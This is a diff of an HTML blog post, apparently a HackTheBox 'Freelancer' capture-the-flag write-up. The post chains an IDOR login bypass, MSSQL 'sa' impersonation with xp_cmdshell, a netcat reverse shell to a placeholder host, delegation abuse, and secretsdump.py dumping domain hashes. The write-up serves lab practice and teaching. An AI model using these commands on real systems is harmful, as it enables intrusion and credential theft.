@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Freelancer-Windows-Hard</h1>
   
@@ -67,85 +59,85 @@
   <h1 id="freelancer">Freelancer</h1>
 
 <h1 id="1-enumeration">1. Enumeration</h1>
-
-<p>Let’s start with the enumeration using nmap</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled.png" alt="Untitled" /></p>
-
-<p>There are some Microsoft services running including an Active directory and a web application, there was a problem with it because the machine failed open that port with some vpn files. We also can do a user enumeration of kerbrute.</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_1.png" alt="Untitled" /></p>
-
-<p>On the web application there are two log in options, first we registered as freelancer user</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_2.png" alt="Untitled" /></p>
-
-<p>There was no problem with it</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_3.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_4.png" alt="Untitled" /></p>
-
-<p>Continue with the recognition using gobuster looking for directories</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_5.png" alt="Untitled" /></p>
-
-<p>We could see an admin log in interface, we may need to break into it.</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_6.png" alt="Untitled" /></p>
-
+<p><br /><br />
+Let’s start with the enumeration using nmap
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled.png" alt="Untitled" />
+<br /><br />
+There are some Microsoft services running including an Active directory and a web application, there was a problem with it because the machine failed open that port with some vpn files. We also can do a user enumeration of kerbrute.
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_1.png" alt="Untitled" />
+<br /><br />
+On the web application there are two log in options, first we registered as freelancer user
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_2.png" alt="Untitled" />
+<br /><br />
+There was no problem with it
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_3.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_4.png" alt="Untitled" />
+<br /><br />
+Continue with the recognition using gobuster looking for directories
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_5.png" alt="Untitled" />
+<br /><br />
+We could see an admin log in interface, we may need to break into it.
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_6.png" alt="Untitled" />
+<br /><br /></p>
 <h1 id="2-user-flag">2. User flag</h1>
-
-<p>As we created the freelancer account we could see there’s a recovery account directory</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_7.png" alt="Untitled" /></p>
-
-<p>We might use this at some way, but first take account that if you want to create an employer account we will need first the permission of an admin page</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_8.png" alt="Untitled" /></p>
-
-<p>We can recover an account even when we haven’t sign in, so let’s try to recover our employer account</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_9.png" alt="Untitled" /></p>
-
-<p>Then we could log in, as a normal user shouldn’t do something like that now we can set up a chain attack using the new features available on the dashboard</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_10.png" alt="Untitled" /></p>
-
-<p>An employer can sign in on another device without credentials only using a qr code which has 5 minutes of life</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_11.png" alt="Untitled" /></p>
-
-<p>That qr code has a base64 encoded text and the token with the permissions to log in</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_12.png" alt="Untitled" /></p>
-
-<p>If we decode that base64 string, we could see a number, probably a user id, so if it couldn’t validate if the user actually request the qr then we could exploit a IDOR attack just guessing the user id of admin.</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_13.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_14.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_15.png" alt="Untitled" /></p>
-
-<p>Good news, now go to the admin directory we found earlier.</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_16.png" alt="Untitled" /></p>
-
-<p>A SQL terminal, it could be interesting, a place where you can execute code sounds promising.</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_17.png" alt="Untitled" /></p>
-
-<p>There are some information about how to exploit it here:</p>
-
-<p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</a></p>
-
-<p>We can see that the owner of the database is <code class="language-plaintext highlighter-rouge">sa</code></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_18.png" alt="Untitled" /></p>
-
-<p>To get the reverse shell we will need to follow the next steps:</p>
-
+<p><br /><br />
+As we created the freelancer account we could see there’s a recovery account directory
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_7.png" alt="Untitled" />
+<br /><br />
+We might use this at some way, but first take account that if you want to create an employer account we will need first the permission of an admin page 
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_8.png" alt="Untitled" />
+<br /><br />
+We can recover an account even when we haven’t sign in, so let’s try to recover our employer account
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_9.png" alt="Untitled" />
+<br /><br />
+Then we could log in, as a normal user shouldn’t do something like that now we can set up a chain attack using the new features available on the dashboard
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_10.png" alt="Untitled" />
+<br /><br />
+An employer can sign in on another device without credentials only using a qr code which has 5 minutes of life
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_11.png" alt="Untitled" />
+<br /><br />
+That qr code has a base64 encoded text and the token with the permissions to log in
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_12.png" alt="Untitled" />
+<br /><br />
+If we decode that base64 string, we could see a number, probably a user id, so if it couldn’t validate if the user actually request the qr then we could exploit a IDOR attack just guessing the user id of admin.
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_13.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_14.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_15.png" alt="Untitled" />
+<br /><br />
+Good news, now go to the admin directory we found earlier.
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_16.png" alt="Untitled" />
+<br /><br />
+A SQL terminal, it could be interesting, a place where you can execute code sounds promising.
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_17.png" alt="Untitled" />
+<br /><br />
+There are some information about how to exploit it here:
+<br /><br />
+<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</a>
+<br /><br />
+We can see that the owner of the database is <code class="language-plaintext highlighter-rouge">sa</code>
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_18.png" alt="Untitled" />
+<br /><br />
+To get the reverse shell we will need to follow the next steps:
+<br /><br /></p>
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span><span class="n">Sign</span> <span class="k">in</span> <span class="k">as</span> <span class="n">db</span> <span class="k">owner</span>
 <span class="k">EXECUTE</span> <span class="k">AS</span> <span class="n">LOGIN</span> <span class="o">=</span> <span class="s1">'sa'</span>
 <span class="o">#</span><span class="n">It</span> <span class="n">should</span> <span class="k">return</span> <span class="n">sa</span> <span class="k">as</span> <span class="n">the</span> <span class="k">current</span> <span class="k">user</span>
@@ -168,62 +160,62 @@ powershell -noprofile'</span>
 <span class="k">EXEC</span> <span class="n">xp_cmdshell</span> <span class="s1">'%TEMP%</span><span class="se">\n</span><span class="s1">c64.exe x.x.x.x xxxx -e powershell'</span>
 
 </code></pre></div></div>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_19.png" alt="Untitled" /></p>
-
-<p>In downloads there are some SQL files, go to configuration files to find some creds</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_20.png" alt="Untitled" /></p>
-
-<p>Those creds are useful for mikasaAckerman use RunasCs to get a shell as that user</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_21.png" alt="Untitled" /></p>
-
-<p>Here we have user flag and a starting point to elevate our privileges using MEMORY.7z file download it and analyze it</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_22.png" alt="Untitled" /></p>
-
+<p><br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_19.png" alt="Untitled" />
+<br /><br />
+In downloads there are some SQL files, go to configuration files to find some creds
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_20.png" alt="Untitled" />
+<br /><br />
+Those creds are useful for mikasaAckerman use RunasCs to get a shell as that user
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_21.png" alt="Untitled" />
+<br /><br />
+Here we have user flag and a starting point to elevate our privileges using MEMORY.7z file download it and analyze it
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_22.png" alt="Untitled" />
+<br /><br /></p>
 <h1 id="3priv-esc">3.Priv esc</h1>
-
+<p><br /><br /></p>
 <aside>
 🪡 When you unzip that file you’ll find a .DMP file, those are dump memory, those files are used when you need to capture information about the state of a memory, there are tools like windbg to analyze it but we need to find creds or hashes at some way, so we will use mamprocFS which open a virtual system to see files
 
 </aside>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_23.png" alt="Untitled" /></p>
-
-<p>To extract hashes we will need to install some plugins, follow the instructions</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_24.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_25.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_26.png" alt="Untitled" /></p>
-
-<p>Mount the virtual system</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_27.png" alt="Untitled" /></p>
-
-<p>If you followed all steps above you will find lorra199 creds</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_28.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_29.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_30.png" alt="Untitled" /></p>
-
-<p>You can log on as lorra in PS using evilwinrm but if you try to enumerate the system there’s a AV blocking you to execute malicious code, so let’s enumerate active directory with other way extracting bloodhound files</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_31.png" alt="Untitled" /></p>
-
-<p>As you can see lorra has direct connection with the domain controller and is member of AD RECYCLE BIN it means we could be able to elevate our privileges stealing hashes from cache</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_32.png" alt="Untitled" /></p>
-
-<p>To successfully obtain the ticket and save it on the cache you will need to sync the clocks use this command the number of times that you need it (it could be a lot)</p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_33.png" alt="Untitled" /></p>
-
+<p><br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_23.png" alt="Untitled" />
+<br /><br />
+To extract hashes we will need to install some plugins, follow the instructions 
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_24.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_25.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_26.png" alt="Untitled" />
+<br /><br />
+Mount the virtual system
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_27.png" alt="Untitled" />
+<br /><br />
+If you followed all steps above you will find lorra199 creds
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_28.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_29.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_30.png" alt="Untitled" />
+<br /><br />
+You can log on as lorra in PS using evilwinrm but if you try to enumerate the system there’s a AV blocking you to execute malicious code, so let’s enumerate active directory with other way extracting bloodhound files
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_31.png" alt="Untitled" />
+<br /><br />
+As you can see lorra has direct connection with the domain controller and is member of AD RECYCLE BIN it means we could be able to elevate our privileges stealing hashes from cache
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_32.png" alt="Untitled" />
+<br /><br />
+To successfully obtain the ticket and save it on the cache you will need to sync the clocks use this command the number of times that you need it (it could be a lot)
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_33.png" alt="Untitled" />
+<br /><br /></p>
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Add a new computer on AD domain</span><span class="w">
 </span><span class="n">addcomputer.py</span><span class="w"> </span><span class="nt">-computer-name</span><span class="w"> </span><span class="nx">NAME</span><span class="err">$</span><span class="w"> </span><span class="nt">-computer-pass</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nt">-dc-host</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nt">-domain-netbios</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">domain/userauth:passworduserauth</span><span class="w">
 </span><span class="c">#Configure delegation resources-based</span><span class="w">
@@ -236,21 +228,26 @@ powershell -noprofile'</span>
 </span><span class="c">#Dumpiong secrets </span><span class="w">
 </span><span class="n">secretsdump.py</span><span class="w"> </span><span class="nt">-dc-ip</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="nt">-target-ip</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="nt">-k</span><span class="w"> </span><span class="nt">-no-pass</span><span class="w"> </span><span class="nx">freelancer.htb/Administrator</span><span class="err">@</span><span class="nx">DC.freelancer.htb</span><span class="w"> </span><span class="nt">-just-dc-ntlm</span><span class="w">
 </span></code></pre></div></div>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_34.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_35.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_36.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_37.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_38.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_39.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_40.png" alt="Untitled" />
+<p><br /><br />
